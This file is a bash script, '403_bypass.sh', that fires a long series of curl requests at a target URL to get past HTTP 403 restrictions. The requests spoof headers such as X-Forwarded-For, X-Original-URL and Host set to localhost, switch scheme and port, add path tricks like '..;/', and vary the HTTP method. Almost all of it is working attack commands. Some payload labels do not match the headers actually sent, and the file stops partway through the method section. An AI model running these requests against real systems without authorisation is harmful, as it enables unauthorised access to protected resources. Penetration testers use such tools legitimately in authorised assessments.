#!/bin/bash

# Partial bash safe mode: http://redsymbol.net/articles/unofficial-bash-strict-mode/
set -o pipefail
IFS=$'\n\t'

# Arg parse
for i in "$@"; do
    case $i in
    --url|-u)
        URL="$2"
        shift;shift;
        ;;
    --outdir|-o)
        OUTDIR="$2"
        shift;shift;
        ;;
    *)
        ;;
    esac
done

if [[ -z "$URL" ]];
then
    echo "Usage: $0 --url <URL> [--outdir <OUTDIR>]"
    echo 'Like : ./403_bypass.sh -u http://127.0.0.1/ -o bypass-403-$VHOST-$(date +%Y-%m-%d-%T)'
    exit 42
fi

if [ -z "$OUTDIR" ]; then
    OUTDIR="bypass-403-$VHOST-$(date '+%Y-%m-%d-%T')"
fi

mkdir -pv "$OUTDIR" && cd "$OUTDIR"

# Colors
red="\e[31m"
green="\e[32m"
blue="\e[34m"
cyan="\e[96m"
bold="\033[1m"
end="\e[0m"

print() {
	status=$(echo $code | awk '{print $2}')
if [[ ${status} =~ 2.. ]];then
	echo -e "${bold}${green} $code ${end}${end} "
else
	echo -e "${bold}${red} $code ${end}${end}"
fi
}

if [[ ! "$URL" =~ ^https?://[^/]+/.*$ ]]; then
	echo "Url is might be badly formated"
	exit 42
fi

SCHEME=$(echo "$URL" | cut -d: -f1)
echo "SCHEME=$SCHEME"
VHOST=$(echo "$URL" | cut -d/ -f3)
echo "VHOST=$VHOST"
# Not using PATH, avoid conflicts
PAT=$(echo "$URL" | cut -d/ -f4-)
echo "PAT=$PAT"

user_agent="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"

echo -e ${blue}"----------------------"${end}
echo -e ${cyan}"[+] Original request  "${end}
echo -e ${blue}"----------------------"${end}

echo -n "Clean request test Payload:"
echo curl --path-as-is -skg -o "original.html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "original.html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "$URL" -H "$user_agent")
print


echo -e ${blue}"----------------------"${end}
echo -e ${cyan}"[+] HTTP Header Bypass"${end}
echo -e ${blue}"----------------------"${end}

echo -n "X-Originally-Forwarded-For Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Originating-  Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Originating-IP Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "True-Client-IP Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "True-Client-IP Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "From Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "Profile http:// Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$VHOST" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Profile: http://$VHOST" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Arbitrary http:// Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$VHOST" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Arbitrary: http://$VHOST" -X GET "$URL" -H "$user_agent")
print
echo -n "X-HTTP-DestinationURL http:// Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$VHOST" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-HTTP-DestinationURL: http://$VHOST" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Proto http:// Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$VHOST" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Proto: http://$VHOST" -X GET "$URL" -H "$user_agent")
print
echo -n "Destination Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "Proxy Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "CF-Connecting_IP:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "CF-Connecting-IP:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "$URL" -H "$user_agent")
print
echo -n "Referer Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referer: $URL" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referer: $URL" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Custom-IP-Authorization Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Custom-IP-Authorization..;/ Payload"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL..;/" -H "$user_agent")
print
echo -n "X-Originating-IP Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-For Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Remote-IP Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Client-IP Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Host Payload"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Host Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Original-URL Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-URL: /$PAT" -X GET "$URL/anything" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-URL: /$PAT" -X GET "$URL/anything" -H "$user_agent")
print
echo -n "X-Rewrite-URL Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Rewrite-URL: /$PAT" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Rewrite-URL: /$PAT" -X GET "$URL" -H "$user_agent")
print
echo -n "Content-Length Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Content-Length: 0" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Content-Length: 0" -X GET "$URL" -H "$user_agent")
print
echo -n "X-ProxyUser-Ip Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Base-Url Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Client-IP Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Http-Url Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Proxy-Host Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Proxy-Url Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Real-Ip Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Redirect Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Referrer Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Request-Uri Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Uri Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Url Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forward-For Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-By Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-For-Original Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Server Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarder-For Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Http-Destinationurl Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Http-Host-Override Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Original-Remote-Addr Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Proxy-Url Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Real-Ip Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Remote-Addr Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Host: <empty> Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: " -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: " -X GET "$URL" -H "$user_agent")
print
echo -n "Host: localhost Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: localhost" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: localhost" -X GET "$URL" -H "$user_agent")
print
echo -n "Host: 127.0.0.1 Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Host: 0.0.0.0 Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 0.0.0.0" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 0.0.0.0" -X GET "$URL" -H "$user_agent")
print
echo -n "X-OReferrer Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$URL" -H "$user_agent")
print



echo -e ${blue}"-------------------------"${end}
echo -e ${cyan}"[+] Protocol Based Bypass"${end}
echo -e ${blue}"-------------------------"${end}
echo -n "HTTP Scheme Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "http://$VHOST/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "http://$VHOST/$PAT" -H "$user_agent")
print
echo -n "HTTPs Scheme Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "https://$VHOST/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "https://$VHOST/$PAT" -H "$user_agent")
print
echo -n "X-Forwarded-Scheme HTTP Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Scheme HTTPs Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "$URL" -H "$user_agent")
print



echo -e ${blue}"-------------------------"${end}
echo -e ${cyan}"[+] Port Based Bypass"${end}
echo -e ${blue}"-------------------------"${end}
echo -n "X-Forwarded-Port 443 Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Port 4443 Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Port 80 Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Port 8080 Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded-Port 8443 Payload:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "$URL" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "$URL" -H "$user_agent")
print


echo -e ${blue}"----------------------"${end}
echo -e ${cyan}"[+] HTTP Method Bypass"${end}
echo -e ${blue}"----------------------"${end}

echo -n "GET : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X GET
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X GET)
print
echo -n "POST : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X POST
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X POST)
print
echo -n "HEAD :"
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -I -H "$user_agent"
